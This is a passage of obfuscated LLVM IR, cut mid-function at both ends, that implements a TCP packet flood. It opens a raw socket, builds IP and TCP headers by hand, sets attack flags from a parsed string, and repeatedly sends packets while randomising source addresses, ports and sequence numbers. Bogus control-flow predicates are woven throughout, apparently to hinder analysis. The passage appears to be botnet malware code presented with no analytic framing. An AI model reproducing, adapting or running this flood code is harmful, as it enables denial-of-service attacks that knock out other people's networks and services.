  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %16, align 8
  store i32 %1, i32* %17, align 4
  store i32 %2, i32* %18, align 4
  store i8* %3, i8** %19, align 8
  store i32 %4, i32* %20, align 4
  store i32 %5, i32* %21, align 4
  store i32 %6, i32* %22, align 4
  %34 = load i32, i32* %21, align 4
  store i32 %34, i32* %23, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %17, align 4
  %37 = icmp eq i32 %36, 0
  %38 = load i32, i32* @x.105
  %39 = load i32, i32* @y.106
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %66

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* @x.105
  %48 = load i32, i32* @y.106
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = call i32 @rand_cmwc()
  %56 = trunc i32 %55 to i16
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %56, i16* %57, align 2
  %58 = load i32, i32* @x.105
  %59 = load i32, i32* @y.106
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %71

; <label>:66:                                     ; preds = %originalBBpart2
  %67 = load i32, i32* %17, align 4
  %68 = trunc i32 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #10
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %69, i16* %70, align 2
  br label %71

; <label>:71:                                     ; preds = %66, %originalBBpart24
  %72 = load i8*, i8** %16, align 8
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %74 = call i32 @getHost(i8* %72, %struct.in_addr* %73)
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %71
  br label %591

; <label>:77:                                     ; preds = %71
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %79 = getelementptr inbounds [8 x i8], [8 x i8]* %78, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 8, i32 4, i1 false)
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %80, i32* %25, align 4
  %81 = load i32, i32* %25, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %100, label %83

; <label>:83:                                     ; preds = %77
  %84 = load i32, i32* @x.105
  %85 = load i32, i32* @y.106
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = load i32, i32* @x.105
  %93 = load i32, i32* @y.106
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %591

; <label>:100:                                    ; preds = %77
  store i32 1, i32* %26, align 4
  %101 = load i32, i32* %25, align 4
  %102 = bitcast i32* %26 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #5
  %104 = icmp slt i32 %103, 0
  br i1 %104, label %105, label %122

; <label>:105:                                    ; preds = %100
  %106 = load i32, i32* @x.105
  %107 = load i32, i32* @y.106
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %105
  %114 = load i32, i32* @x.105
  %115 = load i32, i32* @y.106
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %591

; <label>:122:                                    ; preds = %100
  %123 = load i32, i32* %22, align 4
  %124 = icmp eq i32 %123, 0
  br i1 %124, label %125, label %126

; <label>:125:                                    ; preds = %122
  store i32 0, i32* %27, align 4
  br label %132

; <label>:126:                                    ; preds = %122
  %127 = load i32, i32* %22, align 4
  %128 = sub nsw i32 32, %127
  %129 = shl i32 1, %128
  %130 = sub nsw i32 %129, 1
  %131 = xor i32 %130, -1
  store i32 %131, i32* %27, align 4
  br label %132

; <label>:132:                                    ; preds = %126, %125
  %133 = load i32, i32* @x.105
  %134 = load i32, i32* @y.106
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %132
  %141 = load i32, i32* %20, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 40, %142
  %144 = call i8* @llvm.stacksave()
  store i8* %144, i8** %28, align 8
  %145 = alloca i8, i64 %143, align 16
  %146 = bitcast i8* %145 to %struct.iphdr*
  store %struct.iphdr* %146, %struct.iphdr** %29, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = getelementptr i8, i8* %148, i64 20
  %150 = bitcast i8* %149 to %struct.tcphdr*
  store %struct.tcphdr* %150, %struct.tcphdr** %30, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = load i32, i32* %27, align 4
  %156 = call i32 @getRandomIP(i32 %155)
  %157 = call i32 @htonl(i32 %156) #10
  %158 = load i32, i32* %20, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 20, %159
  %161 = trunc i64 %160 to i32
  call void @makeIPPacket(%struct.iphdr* %151, i32 %154, i32 %157, i8 zeroext 6, i32 %161)
  %162 = call i32 @rand_cmwc()
  %163 = trunc i32 %162 to i16
  %164 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %165 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %164, i32 0, i32 0
  %166 = bitcast %union.anon* %165 to %struct.anon.0*
  %167 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %166, i32 0, i32 0
  store i16 %163, i16* %167, align 4
  %168 = call i32 @rand_cmwc()
  %169 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 0
  %171 = bitcast %union.anon* %170 to %struct.anon.0*
  %172 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %171, i32 0, i32 2
  store i32 %168, i32* %172, align 4
  %173 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %174 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon* %174 to %struct.anon.0*
  %176 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %175, i32 0, i32 3
  store i32 0, i32* %176, align 4
  %177 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %178 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %177, i32 0, i32 0
  %179 = bitcast %union.anon* %178 to %struct.anon.0*
  %180 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %179, i32 0, i32 4
  %181 = load i16, i16* %180, align 4
  %182 = and i16 %181, -241
  %183 = or i16 %182, 80
  store i16 %183, i16* %180, align 4
  %184 = load i8*, i8** %19, align 8
  %185 = call i32 @strcmp(i8* %184, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.914, i32 0, i32 0)) #9
  %186 = icmp ne i32 %185, 0
  %187 = load i32, i32* @x.105
  %188 = load i32, i32* @y.106
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart246, label %originalBB14alteredBB

originalBBpart246:                                ; preds = %originalBB14
  br i1 %186, label %247, label %195

; <label>:195:                                    ; preds = %originalBBpart246
  %196 = load i32, i32* @x.105
  %197 = load i32, i32* @y.106
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %195
  %204 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon* %205 to %struct.anon.0*
  %207 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -513
  %210 = or i16 %209, 512
  store i16 %210, i16* %207, align 4
  %211 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon* %212 to %struct.anon.0*
  %214 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %215, -1025
  %217 = or i16 %216, 1024
  store i16 %217, i16* %214, align 4
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon* %219 to %struct.anon.0*
  %221 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %222, -257
  %224 = or i16 %223, 256
  store i16 %224, i16* %221, align 4
  %225 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 0
  %227 = bitcast %union.anon* %226 to %struct.anon.0*
  %228 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %229, -4097
  %231 = or i16 %230, 4096
  store i16 %231, i16* %228, align 4
  %232 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon* %233 to %struct.anon.0*
  %235 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %236, -2049
  %238 = or i16 %237, 2048
  store i16 %238, i16* %235, align 4
  %239 = load i32, i32* @x.105
  %240 = load i32, i32* @y.106
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart2114, label %originalBB48alteredBB

originalBBpart2114:                               ; preds = %originalBB48
  br label %401

; <label>:247:                                    ; preds = %originalBBpart246
  %248 = load i8*, i8** %19, align 8
  %249 = call i8* @strtok(i8* %248, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %249, i8** %31, align 8
  br label %250

; <label>:250:                                    ; preds = %398, %247
  %251 = load i8*, i8** %31, align 8
  %252 = icmp ne i8* %251, null
  br i1 %252, label %253, label %400

; <label>:253:                                    ; preds = %250
  %254 = load i8*, i8** %31, align 8
  %255 = call i32 @strcmp(i8* %254, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.916, i32 0, i32 0)) #9
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %265, label %257

; <label>:257:                                    ; preds = %253
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon* %259 to %struct.anon.0*
  %261 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %262, -513
  %264 = or i16 %263, 512
  store i16 %264, i16* %261, align 4
  br label %398

; <label>:265:                                    ; preds = %253
  %266 = load i32, i32* @x.105
  %267 = load i32, i32* @y.106
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %265
  %274 = load i8*, i8** %31, align 8
  %275 = call i32 @strcmp(i8* %274, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.917, i32 0, i32 0)) #9
  %276 = icmp ne i32 %275, 0
  %277 = load i32, i32* @x.105
  %278 = load i32, i32* @y.106
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br i1 %276, label %309, label %285

; <label>:285:                                    ; preds = %originalBBpart2118
  %286 = load i32, i32* @x.105
  %287 = load i32, i32* @y.106
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %285
  %294 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %295 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %294, i32 0, i32 0
  %296 = bitcast %union.anon* %295 to %struct.anon.0*
  %297 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %296, i32 0, i32 4
  %298 = load i16, i16* %297, align 4
  %299 = and i16 %298, -1025
  %300 = or i16 %299, 1024
  store i16 %300, i16* %297, align 4
  %301 = load i32, i32* @x.105
  %302 = load i32, i32* @y.106
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart2139, label %originalBB120alteredBB

originalBBpart2139:                               ; preds = %originalBB120
  br label %397

; <label>:309:                                    ; preds = %originalBBpart2118
  %310 = load i8*, i8** %31, align 8
  %311 = call i32 @strcmp(i8* %310, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.918, i32 0, i32 0)) #9
  %312 = icmp ne i32 %311, 0
  br i1 %312, label %321, label %313

; <label>:313:                                    ; preds = %309
  %314 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon* %315 to %struct.anon.0*
  %317 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = and i16 %318, -257
  %320 = or i16 %319, 256
  store i16 %320, i16* %317, align 4
  br label %396

; <label>:321:                                    ; preds = %309
  %322 = load i8*, i8** %31, align 8
  %323 = call i32 @strcmp(i8* %322, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.919, i32 0, i32 0)) #9
  %324 = icmp ne i32 %323, 0
  br i1 %324, label %333, label %325

; <label>:325:                                    ; preds = %321
  %326 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %327 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %326, i32 0, i32 0
  %328 = bitcast %union.anon* %327 to %struct.anon.0*
  %329 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %328, i32 0, i32 4
  %330 = load i16, i16* %329, align 4
  %331 = and i16 %330, -4097
  %332 = or i16 %331, 4096
  store i16 %332, i16* %329, align 4
  br label %379

; <label>:333:                                    ; preds = %321
  %334 = load i8*, i8** %31, align 8
  %335 = call i32 @strcmp(i8* %334, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.920, i32 0, i32 0)) #9
  %336 = icmp ne i32 %335, 0
  br i1 %336, label %361, label %337

; <label>:337:                                    ; preds = %333
  %338 = load i32, i32* @x.105
  %339 = load i32, i32* @y.106
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %337
  %346 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %347 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %346, i32 0, i32 0
  %348 = bitcast %union.anon* %347 to %struct.anon.0*
  %349 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = and i16 %350, -2049
  %352 = or i16 %351, 2048
  store i16 %352, i16* %349, align 4
  %353 = load i32, i32* @x.105
  %354 = load i32, i32* @y.106
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart2161, label %originalBB141alteredBB

originalBBpart2161:                               ; preds = %originalBB141
  br label %378

; <label>:361:                                    ; preds = %333
  %362 = load i32, i32* @x.105
  %363 = load i32, i32* @y.106
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB163, label %originalBB163alteredBB

originalBB163:                                    ; preds = %originalBB163alteredBB, %361
  %370 = load i32, i32* @x.105
  %371 = load i32, i32* @y.106
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBBpart2165, label %originalBB163alteredBB

originalBBpart2165:                               ; preds = %originalBB163
  br label %378

; <label>:378:                                    ; preds = %originalBBpart2165, %originalBBpart2161
  br label %379

; <label>:379:                                    ; preds = %378, %325
  %380 = load i32, i32* @x.105
  %381 = load i32, i32* @y.106
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBB167, label %originalBB167alteredBB

originalBB167:                                    ; preds = %originalBB167alteredBB, %379
  %388 = load i32, i32* @x.105
  %389 = load i32, i32* @y.106
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart2169, label %originalBB167alteredBB

originalBBpart2169:                               ; preds = %originalBB167
  br label %396

; <label>:396:                                    ; preds = %originalBBpart2169, %313
  br label %397

; <label>:397:                                    ; preds = %396, %originalBBpart2139
  br label %398

; <label>:398:                                    ; preds = %397, %257
  %399 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %399, i8** %31, align 8
  br label %250

; <label>:400:                                    ; preds = %250
  br label %401

; <label>:401:                                    ; preds = %400, %originalBBpart2114
  %402 = call i32 @rand_cmwc()
  %403 = trunc i32 %402 to i16
  %404 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 0
  %406 = bitcast %union.anon* %405 to %struct.anon.0*
  %407 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %406, i32 0, i32 5
  store i16 %403, i16* %407, align 2
  %408 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %409 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %408, i32 0, i32 0
  %410 = bitcast %union.anon* %409 to %struct.anon.0*
  %411 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %410, i32 0, i32 6
  store i16 0, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 0
  %414 = bitcast %union.anon* %413 to %struct.anon.0*
  %415 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %414, i32 0, i32 7
  store i16 0, i16* %415, align 2
  %416 = load i32, i32* %17, align 4
  %417 = icmp eq i32 %416, 0
  br i1 %417, label %418, label %420

; <label>:418:                                    ; preds = %401
  %419 = call i32 @rand_cmwc()
  br label %441

; <label>:420:                                    ; preds = %401
  %421 = load i32, i32* @x.105
  %422 = load i32, i32* @y.106
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB171, label %originalBB171alteredBB

originalBB171:                                    ; preds = %originalBB171alteredBB, %420
  %429 = load i32, i32* %17, align 4
  %430 = trunc i32 %429 to i16
  %431 = call zeroext i16 @htons(i16 zeroext %430) #10
  %432 = zext i16 %431 to i32
  %433 = load i32, i32* @x.105
  %434 = load i32, i32* @y.106
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBBpart2173, label %originalBB171alteredBB

originalBBpart2173:                               ; preds = %originalBB171
  br label %441

; <label>:441:                                    ; preds = %originalBBpart2173, %418
  %442 = phi i32 [ %419, %418 ], [ %432, %originalBBpart2173 ]
  %443 = trunc i32 %442 to i16
  %444 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %445 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %444, i32 0, i32 0
  %446 = bitcast %union.anon* %445 to %struct.anon.0*
  %447 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %446, i32 0, i32 1
  store i16 %443, i16* %447, align 2
  %448 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %449 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %450 = call zeroext i16 @tcpcsum(%struct.iphdr* %448, %struct.tcphdr* %449)
  %451 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  %453 = bitcast %union.anon* %452 to %struct.anon.0*
  %454 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %453, i32 0, i32 6
  store i16 %450, i16* %454, align 4
  %455 = bitcast i8* %145 to i16*
  %456 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 2
  %458 = load i16, i16* %457, align 2
  %459 = zext i16 %458 to i32
  %460 = call zeroext i16 @csum(i16* %455, i32 %459)
  %461 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 7
  store i16 %460, i16* %462, align 2
  %463 = call i64 @time(i64* null) #5
  %464 = load i32, i32* %18, align 4
  %465 = sext i32 %464 to i64
  %466 = add nsw i64 %463, %465
  %467 = trunc i64 %466 to i32
  store i32 %467, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %468

; <label>:468:                                    ; preds = %originalBBpart2197, %originalBBpart2181, %441
  br label %469

; <label>:469:                                    ; preds = %468
  %470 = load i32, i32* @x.105
  %471 = load i32, i32* @y.106
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBB175, label %originalBB175alteredBB

originalBB175:                                    ; preds = %originalBB175alteredBB, %469
  %478 = load i32, i32* %25, align 4
  %479 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %480 = call i64 @sendto(i32 %478, i8* %145, i64 %143, i32 0, %struct.sockaddr* %479, i32 16)
  %481 = load i32, i32* %27, align 4
  %482 = call i32 @getRandomIP(i32 %481)
  %483 = call i32 @htonl(i32 %482) #10
  %484 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 8
  store i32 %483, i32* %485, align 4
  %486 = call i32 @rand_cmwc()
  %487 = trunc i32 %486 to i16
  %488 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i32 0, i32 3
  store i16 %487, i16* %489, align 4
  %490 = call i32 @rand_cmwc()
  %491 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %492 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %491, i32 0, i32 0
  %493 = bitcast %union.anon* %492 to %struct.anon.0*
  %494 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %493, i32 0, i32 2
  store i32 %490, i32* %494, align 4
  %495 = call i32 @rand_cmwc()
  %496 = trunc i32 %495 to i16
  %497 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %498 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %497, i32 0, i32 0
  %499 = bitcast %union.anon* %498 to %struct.anon.0*
  %500 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %499, i32 0, i32 0
  store i16 %496, i16* %500, align 4
  %501 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %502 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %501, i32 0, i32 0
  %503 = bitcast %union.anon* %502 to %struct.anon.0*
  %504 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %503, i32 0, i32 6
  store i16 0, i16* %504, align 4
  %505 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %506 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %507 = call zeroext i16 @tcpcsum(%struct.iphdr* %505, %struct.tcphdr* %506)
  %508 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %509 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %508, i32 0, i32 0
  %510 = bitcast %union.anon* %509 to %struct.anon.0*
  %511 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %510, i32 0, i32 6
  store i16 %507, i16* %511, align 4
  %512 = bitcast i8* %145 to i16*
  %513 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %514 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %513, i32 0, i32 2
  %515 = load i16, i16* %514, align 2
  %516 = zext i16 %515 to i32
  %517 = call zeroext i16 @csum(i16* %512, i32 %516)
  %518 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %519 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %518, i32 0, i32 7
  store i16 %517, i16* %519, align 2
  %520 = load i32, i32* %33, align 4
  %521 = load i32, i32* %23, align 4
  %522 = icmp eq i32 %520, %521
  %523 = load i32, i32* @x.105
  %524 = load i32, i32* @y.106
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBBpart2177, label %originalBB175alteredBB

originalBBpart2177:                               ; preds = %originalBB175
  br i1 %522, label %531, label %554

